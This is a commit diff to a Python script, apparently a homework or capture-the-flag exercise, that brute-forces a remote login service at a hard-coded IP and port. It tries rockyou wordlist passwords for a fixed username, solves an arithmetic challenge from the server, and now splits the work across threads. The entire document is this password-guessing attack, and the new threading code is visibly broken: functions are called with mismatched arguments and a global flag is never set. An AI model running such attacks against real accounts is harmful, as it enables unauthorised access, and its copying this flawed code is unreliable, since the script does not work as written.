3aaf2b38ca4672ee72fdd208c8cdc8b928533582
root <root@localhost.localdomain>
2019-09-10 12:53:43 -0400

    bb

--- week/2/stub.py
+++ week/2/stub.py
@@ -1,14 +1,49 @@
 import socket
 import re
 import operator
+import threading
 
 
 host = "157.230.179.99" # IP address here
 port = 1337 # Port here
-wordlist = "/Users/dokidokicrisis/wordlist/rockyou.txt" # Point to wordlist file
+wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+wlmac = "/Users/dokidokicrisis/wordlist/rockyou.txt"
+
+def create_threads(passwords,thread_num):
+	p_len = len(passwords)
+	t_len = p_len//thread_num
+	split_points = []
+	for n in range(thread_num):
+		if n == thread_num-1:
+			split_points.append((n*t_len,p_len-1))
+		else:
+			split_points.append((n*t_len,(n+1)*t_len-1))
+
+	print(p_len)
+	print("=====")
+	print(split_points)
+
+
+	thread_list = [threading.Thread(target=run_brute_force,
+		args=(
+            passwords[split_point[0] : split_point[1]]
+        )
+    ) for split_point in split_points]
+
+	return thread_list
+
+def run_brute_force(passwords):
+	global pw_find
+
+	for pw in passwords:
+		if pw_find:
+			break
+		else:
+			if brute_force(pw.rstrip()):
+				pw_find = True
 
 def brute_force():
-	file = open(wordlist,"r")
+	file = open(wlmac,"r")
 	username = "ejnorman84"
 	regex = r"(?P<firstNum>(\d)*)\s(?P<op>([\+\-\*\/]))\s(?P<secNum>(\d)*)"
 	ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.floordiv }
@@ -20,7 +55,7 @@ def brute_force():
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((host, port))
 
-		d1 = s.recv(1024)
+		d1 = str(s.recv(1024))
 
 		while re.search(regex,d1) == None:
 			d1 = s.recv(1024)
@@ -53,7 +88,7 @@ def brute_force():
 			d4 = s.recv(1024)
 
 		print("d4 result is " + d4)
-		if "Fail" in d4 == False:
+		if not "Fail" in d4:
 			print("SUCCESS")
 			print("PASSWORD: " + pw)
 			return
@@ -64,4 +99,5 @@ def brute_force():
 		print("++++s closed++++")
 
 if __name__ == '__main__':
-	brute_force()
+	
+	 brute_force()
